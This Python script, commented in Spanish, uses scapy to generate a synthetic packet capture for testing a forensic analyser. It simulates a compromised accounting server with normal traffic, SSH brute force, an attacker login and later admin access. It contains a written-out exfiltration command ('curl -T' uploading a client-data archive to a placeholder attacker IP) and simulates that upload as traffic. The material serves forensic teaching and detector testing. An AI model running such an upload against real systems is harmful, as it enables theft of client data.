#!/usr/bin/env python3
"""
generar_captura_demo.py - Crea una captura .pcap SINTÉTICA para probar analizar_pcap.py.

Recrea en la red el incidente del Caso 3 de mi laboratorio forense (servidor de un estudio
contable comprometido por SSH): tráfico normal, fuerza bruta SSH, acceso del atacante,
exfiltración de datos por HTTP PUT a una IP sin resolución DNS previa y, más tarde, la
conexión legítima del administrador desde la LAN.

Todo es ficticio: IPs de documentación (RFC 5737), dominios reservados .example (RFC 2606)
y datos aleatorios en lugar del archivo exfiltrado.

Uso:
  python generar_captura_demo.py [demo/incidente_servidor.pcap]
"""
import random
import struct
import sys
from datetime import datetime, timezone
from pathlib import Path

from scapy.all import DNS, DNSQR, DNSRR, IP, TCP, UDP, Ether, Raw, wrpcap

random.seed(14112026)  # captura reproducible

SERVIDOR, GATEWAY, ADMIN = "192.168.1.20", "192.168.1.1", "192.168.1.10"
MAC = {SERVIDOR: "02:00:00:00:01:20", GATEWAY: "02:00:00:00:01:01", ADMIN: "02:00:00:00:01:10"}
MSS = 1400
paquetes = []


def ts(hhmmss, extra=0.0):
    h, m, s = map(int, hhmmss.split(":"))
    return datetime(2026, 11, 14, h, m, s, tzinfo=timezone.utc).timestamp() + extra


def ether(src, dst):
    # Todo lo que no es de la LAN se ve con la MAC del router
    return Ether(src=MAC.get(src, MAC[GATEWAY]), dst=MAC.get(dst, MAC[GATEWAY]))


def agregar(p, t):
    p.time = t
    paquetes.append(p)


def dns(cliente, nombre, ips, t):
    qid = random.randint(1, 65535)
    sport = random.randint(30000, 60000)
    q = ether(cliente, GATEWAY) / IP(src=cliente, dst=GATEWAY) / UDP(sport=sport, dport=53) / \
        DNS(id=qid, rd=1, qd=DNSQR(qname=nombre))
    an = None
    for ip in ips:
        rr = DNSRR(rrname=nombre, type="A", ttl=300, rdata=ip)
        an = rr if an is None else an / rr
    r = ether(GATEWAY, cliente) / IP(src=GATEWAY, dst=cliente) / UDP(sport=53, dport=sport) / \
        DNS(id=qid, qr=1, rd=1, ra=1, qd=DNSQR(qname=nombre), an=an, ancount=len(ips))
    agregar(q, t)
    agregar(r, t + 0.012)


def tcp(cli, srv, sport, dport, t, mensajes, rtt=0.03, duracion=0.0):
    """Sesión TCP completa (handshake, datos con seq/ack correctos, cierre).
    mensajes: lista de (dirección 'c'|'s', bytes). duracion: segundos en que se reparten los datos."""
    segmentos = sum((len(d) + MSS - 1) // MSS for _, d in mensajes)
    paso = max(0.0008, duracion / max(segmentos, 1))
    sc, ss = random.randint(1, 2**31), random.randint(1, 2**31)
    c2s = lambda: ether(cli, srv) / IP(src=cli, dst=srv)
    s2c = lambda: ether(srv, cli) / IP(src=srv, dst=cli)
    agregar(c2s() / TCP(sport=sport, dport=dport, flags="S", seq=sc), t)
    agregar(s2c() / TCP(sport=dport, dport=sport, flags="SA", seq=ss, ack=sc + 1), t + rtt / 2)
    sc += 1; ss += 1
    t += rtt
    agregar(c2s() / TCP(sport=sport, dport=dport, flags="A", seq=sc, ack=ss), t)
    for quien, datos in mensajes:
        for i in range(0, len(datos), MSS):
            seg = datos[i:i + MSS]
            t += paso
            if quien == "c":
                agregar(c2s() / TCP(sport=sport, dport=dport, flags="PA", seq=sc, ack=ss) / Raw(seg), t)
                sc += len(seg)
            else:
                agregar(s2c() / TCP(sport=dport, dport=sport, flags="PA", seq=ss, ack=sc) / Raw(seg), t)
                ss += len(seg)
        t += rtt
    agregar(c2s() / TCP(sport=sport, dport=dport, flags="FA", seq=sc, ack=ss), t)
    agregar(s2c() / TCP(sport=dport, dport=sport, flags="FA", seq=ss, ack=sc + 1), t + rtt / 2)
    agregar(c2s() / TCP(sport=sport, dport=dport, flags="A", seq=sc + 1, ack=ss + 1), t + rtt)
    return t + rtt


def client_hello(sni):
    """TLS 1.2/1.3 ClientHello mínimo con la extensión server_name (SNI)."""
    nombre = sni.encode()
    ext_sni = struct.pack(">HHHBH", 0, len(nombre) + 5, len(nombre) + 3, 0, len(nombre)) + nombre
    ext_versiones = struct.pack(">HHB", 0x002B, 5, 4) + b"\x03\x04\x03\x03"
    extensiones = ext_sni + ext_versiones
    cuerpo = (b"\x03\x03" + random.randbytes(32) + b"\x00" + struct.pack(">H", 6) + b"\x13\x01\x13\x02\xc0\x2f"
              + b"\x01\x00" + struct.pack(">H", len(extensiones)) + extensiones)
    handshake = b"\x01" + len(cuerpo).to_bytes(3, "big") + cuerpo
    return b"\x16\x03\x01" + struct.pack(">H", len(handshake)) + handshake


def https(cli, nombre, ip, t, bajada=6000):
    dns(cli, nombre, [ip], t)
    return tcp(cli, ip, random.randint(40000, 60000), 443, t + 0.05,
               [("c", client_hello(nombre)), ("s", b"\x16\x03\x03" + random.randbytes(1500)),
                ("c", b"\x17\x03\x03" + random.randbytes(300)), ("s", b"\x17\x03\x03" + random.randbytes(bajada))])


def ssh(cli, t, ida, vuelta, srv=SERVIDOR, duracion=2.5):
    return tcp(cli, srv, random.randint(40000, 60000), 22, t,
               [("s", b"SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13\r\n"), ("c", b"SSH-2.0-libssh_0.10.6\r\n"),
                ("c", random.randbytes(ida)), ("s", random.randbytes(vuelta))], duracion=duracion)


# --- 02:00 tráfico normal del servidor ---
https(SERVIDOR, "repo.ubuntu-mirror.example.com", "192.0.2.80", ts("02:00:05"), bajada=40000)
dns(SERVIDOR, "ntp.example.org", ["192.0.2.123"], ts("02:01:00"))
agregar(ether(SERVIDOR, GATEWAY) / IP(src=SERVIDOR, dst="192.0.2.123") / UDP(sport=123, dport=123) / Raw(b"\x23" + bytes(47)), ts("02:01:00", 0.03))
agregar(ether(GATEWAY, SERVIDOR) / IP(src="192.0.2.123", dst=SERVIDOR) / UDP(sport=123, dport=123) / Raw(b"\x24" + random.randbytes(47)), ts("02:01:00", 0.06))

# --- 02:10 → 05:09 fuerza bruta SSH desde tres IPs (muestra: 60 intentos) ---
atacantes = ["198.51.100.23", "203.0.113.77", "192.0.2.150"]
t = ts("02:10:08")
for i in range(60):
    ssh(atacantes[i % 3], t, ida=random.randint(900, 1400), vuelta=random.randint(900, 1400))
    t += 180 + random.random() * 2  # una cada ~3 minutos en la muestra

# --- 04:30 el sistema contable sincroniza con su nube (normal) ---
https(SERVIDOR, "api.contable-nube.example.net", "192.0.2.44", ts("04:30:00"), bajada=12000)

# --- 05:17:42 acceso exitoso del atacante como 'backup' (sesión de 12,5 min) ---
ssh("203.0.113.77", ts("05:17:42"), ida=24000, vuelta=61000, duracion=749)

# --- 05:24:52 exfiltración: curl -T /tmp/.c.tgz http://198.51.100.200/up (sin DNS: IP directa) ---
datos = random.randbytes(900_000)  # en el caso real, el .tgz con /srv/clientes
cabecera = (b"PUT /up HTTP/1.1\r\nHost: 198.51.100.200\r\nUser-Agent: curl/8.5.0\r\nAccept: */*\r\n"
            b"Content-Length: " + str(len(datos)).encode() + b"\r\nExpect: 100-continue\r\n\r\n")
tcp(SERVIDOR, "198.51.100.200", 51514, 80, ts("05:24:52"),
    [("c", cabecera), ("s", b"HTTP/1.1 100 Continue\r\n\r\n"), ("c", datos),
     ("s", b"HTTP/1.1 201 Created\r\nServer: nginx\r\nContent-Length: 0\r\n\r\n")])

# --- 06:15 consulta HTTP normal (sin cifrar) a un sitio de noticias impositivas ---
dns(SERVIDOR, "noticias.impuestos.example.org", ["192.0.2.90"], ts("06:15:00"))
tcp(SERVIDOR, "192.0.2.90", 52000, 80, ts("06:15:00", 0.05),
    [("c", b"GET /vencimientos?mes=11 HTTP/1.1\r\nHost: noticias.impuestos.example.org\r\n"
           b"User-Agent: Wget/1.21.4\r\nAccept: */*\r\n\r\n"),
     ("s", b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 2000\r\n\r\n" + b"<html>" + b"x" * 1994)])

# --- 08:02:00 el administrador entra desde la LAN con clave ---
ssh(ADMIN, ts("08:02:00"), ida=3000, vuelta=9000, duracion=300)

paquetes.sort(key=lambda p: p.time)
salida = Path(sys.argv[1] if len(sys.argv) > 1 else "demo/incidente_servidor.pcap")
salida.parent.mkdir(parents=True, exist_ok=True)
wrpcap(str(salida), paquetes)
print(f"{salida}: {len(paquetes)} paquetes, {salida.stat().st_size:,} bytes")
